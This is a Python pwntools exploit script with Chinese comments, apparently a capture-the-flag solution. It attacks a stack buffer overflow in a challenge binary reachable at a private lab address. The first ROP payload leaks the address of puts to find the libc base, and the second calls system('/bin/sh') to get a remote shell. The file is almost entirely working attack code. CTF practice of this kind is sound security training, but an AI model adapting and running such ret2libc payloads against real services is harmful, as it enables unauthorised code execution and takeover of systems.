import warnings

from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)


def r64_7f():
    return u64(p.recvuntil(b"\x7f")[-6:] + b"\x00\x00")


context(arch="amd64", os="linux")
fileName = "./pwn"
elfName = fileName

LibcName = "./libc6_2.31-0ubuntu9.9_amd64.so"

remoteAddress = "192.168.10.2"
remotePort = 9999

local = 0  # 1 本地测试，0 远端测试
debug = 1

if debug:
    context.log_level = "debug"
    context.terminal = ["tmux", "splitw", "-h"]

if local:
    elf = ELF(fileName)
    libc = ELF(LibcName)
    p = process(fileName)

else:
    p = remote(remoteAddress, remotePort)
    elf = ELF(fileName)
    libc = ELF(LibcName)


pop_rdi = 0x0401AF3
puts_plt = 0x04010D0
puts_got = 0x0404018
ret_addr = 0x040173F  # 返回 welcome 函数头部
ret = 0x040101A  # 返回_init 函数尾部 ret

payload1 = (
    b"A" * (0x30 + 0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
)

# p.recvuntil("Before we start, please enter your character's name:")
# p.sendline("name")

# p.recvuntil("Choose 1, 2, 3, or 4: ")
# p.sendline("2")

# p.recvuntil("Choose 1, 2, 3, or 4: ")
p.sendline(payload1)
puts_addr = r64_7f()
# print(puts_addr)

lib_puts_addr = libc.symbols["puts"]  # 寻找 puts 在该库中的偏移
lib_system_addr = libc.symbols["system"]  # 寻找 sytem 在该库中的偏移
lib_bin_sh_addr = next(libc.search(b"/bin/sh"))  # 寻找“bin/sh”在该库中的偏移

libc_base = puts_addr - lib_puts_addr  # 寻找该库的基地址
system_addr = libc_base + lib_system_addr  # 基地址 + 偏移找 system 真实地址
binsh_addr = libc_base + lib_bin_sh_addr  # 基地址 + 偏移找 bin/sh 真实地址

payload2 = (
    b"0" * (0x30 + 0x8) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
)

# p.recvuntil("Choose 1, 2, 3, or 4: ")
p.sendline(payload2)
p.interactive()
